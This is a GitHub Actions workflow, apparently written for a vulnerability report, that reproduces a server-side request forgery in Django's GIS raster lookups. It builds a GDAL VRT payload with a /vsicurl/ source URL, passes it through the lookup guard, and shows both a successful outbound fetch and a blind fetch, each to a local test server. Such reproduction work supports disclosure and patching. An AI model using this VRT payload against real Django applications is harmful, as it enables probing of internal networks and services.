name: Django GDAL VRT bytes SSRF PoC

on:
  push:
    branches:
      - h1-django-gdal-vrt-bytes-ssrf
  workflow_dispatch:

jobs:
  poc:
    runs-on: ubuntu-latest
    strategy:
      fail-fast: false
      matrix:
        django_ref:
          - stable/5.2.x
          - stable/6.0.x
          - stable/6.1.x
    steps:
      - uses: actions/checkout@v4
      - uses: actions/setup-python@v5
        with:
          python-version: "3.13"
      - name: Install GDAL/GEOS
        run: |
          sudo apt-get update
          sudo apt-get install -y gdal-bin libgdal-dev libgeos-dev
      - name: Install Django branch
        run: |
          python -m pip install -U pip
          python -m pip install "Django @ git+https://github.com/django/django.git@${{ matrix.django_ref }}" "psycopg[binary]"
      - name: Run request.body -> spatial lookup SSRF reproduction
        env:
          DJANGO_SETTINGS_MODULE: poc_settings
        run: |
          cat > poc_settings.py <<'PY'
          SECRET_KEY = "poc"
          ALLOWED_HOSTS = ["testserver"]
          INSTALLED_APPS = ["django.contrib.contenttypes", "django.contrib.gis"]
          DATABASES = {"default": {"ENGINE": "django.contrib.gis.db.backends.postgis", "NAME": "unused"}}
          PY
          cat > poc.py <<'PY'
          import threading
          from http.server import BaseHTTPRequestHandler, HTTPServer

          import django
          django.setup()

          from django.contrib.gis.gdal import GDALRaster
          from django.contrib.gis.db.models import RasterField
          from django.db import connection
          from django.test import RequestFactory

          print("DJANGO_VERSION=", django.get_version())

          hits = []

          src = GDALRaster({
              "name": "/vsimem/h1-source.tif",
              "driver": "GTiff",
              "width": 1,
              "height": 1,
              "srid": 4326,
              "origin": (0, 1),
              "scale": (1, -1),
              "bands": [{"data": [7]}],
          })
          src._flush()
          tiff_bytes = src.vsi_buffer

          class Handler(BaseHTTPRequestHandler):
              def _payload(self):
                  if self.path.startswith("/source.tif"):
                      return "image/tiff", tiff_bytes
                  return "text/plain", b"not-a-raster"

              def do_HEAD(self):
                  hits.append(("HEAD", self.path))
                  content_type, body = self._payload()
                  self.send_response(200)
                  self.send_header("Content-Type", content_type)
                  self.send_header("Content-Length", str(len(body)))
                  self.end_headers()

              def do_GET(self):
                  hits.append(("GET", self.path))
                  content_type, body = self._payload()
                  self.send_response(200)
                  self.send_header("Content-Type", content_type)
                  self.send_header("Content-Length", str(len(body)))
                  self.end_headers()
                  self.wfile.write(body)

              def log_message(self, fmt, *args):
                  pass

          server = HTTPServer(("127.0.0.1", 18765), Handler)
          threading.Thread(target=server.serve_forever, daemon=True).start()

          def make_vrt(url):
              return f"""<VRTDataset rasterXSize="1" rasterYSize="1">
                <SRS>EPSG:4326</SRS>
                <GeoTransform>0,1,0,1,0,-1</GeoTransform>
                <VRTRasterBand dataType="Byte" band="1">
                  <SimpleSource>
                    <SourceFilename relativeToVRT="0">{url}</SourceFilename>
                    <SourceBand>1</SourceBand>
                    <SourceProperties RasterXSize="1" RasterYSize="1" DataType="Byte" BlockXSize="1" BlockYSize="1"/>
                    <SrcRect xOff="0" yOff="0" xSize="1" ySize="1"/>
                    <DstRect xOff="0" yOff="0" xSize="1" ySize="1"/>
                  </SimpleSource>
                </VRTRasterBand>
              </VRTDataset>""".encode()

          field = RasterField(srid=4326)

          # First proof: attacker-controlled Django request.body bytes survive
          # the CVE-2026-15307 lookup guard and cause a successful outbound fetch.
          vrt = make_vrt("/vsicurl/http://127.0.0.1:18765/source.tif")
          request = RequestFactory().post(
              "/lookup",
              data=vrt,
              content_type="application/octet-stream",
          )
          attacker_bytes = request.body
          print("REQUEST_BODY_TYPE=", type(attacker_bytes).__name__)
          print("REQUEST_BODY_LEN=", len(attacker_bytes))
          assert isinstance(attacker_bytes, bytes)

          GDALRaster.check_raster_lookup_value(attacker_bytes)
          print("CHECK_RASTER_LOOKUP_VALUE=ALLOWED_REQUEST_BODY_BYTES")

          prepared = field.get_prep_value(attacker_bytes)
          print("PREPARED_DRIVER=", prepared.driver.name)
          print("HITS_AFTER_PREP=", hits)
          assert prepared.driver.name == "VRT"
          assert hits == []

          # Django's own database-preparation API invokes the PostGIS adapter,
          # which serializes raster band data and dereferences the VRT source.
          adapter = field.get_db_prep_value(attacker_bytes, connection)
          print("DB_PREP_ADAPTER=", type(adapter).__name__)
          print("ADAPTER_BYTES=", len(adapter.ewkb))
          print("HTTP_HITS=", hits)
          assert any(path == "/source.tif" for _, path in hits)
          print("SUCCESSFUL_TARGET_SSRF=CONFIRMED")

          # Second proof: the target does not need to return a valid raster.
          # The outbound HEAD/GET happens before Django/GDAL rejects the content,
          # which makes this a blind SSRF primitive against arbitrary HTTP targets.
          hits.clear()
          blind_vrt = make_vrt("/vsicurl/http://127.0.0.1:18765/not-a-raster")
          blind_request = RequestFactory().post(
              "/lookup",
              data=blind_vrt,
              content_type="application/octet-stream",
          )

          GDALRaster.check_raster_lookup_value(blind_request.body)
          try:
              field.get_db_prep_value(blind_request.body, connection)
          except Exception as exc:
              print("BLIND_TARGET_SERIALIZATION_ERROR=", type(exc).__name__)

          print("BLIND_TARGET_HTTP_HITS=", hits)
          assert any(path == "/not-a-raster" for _, path in hits)
          print("BLIND_SSRF=CONFIRMED")

          server.shutdown()
          print("POC_RESULT=REQUEST_BODY_BYTES_SSRF_CONFIRMED")
          PY
          python poc.py
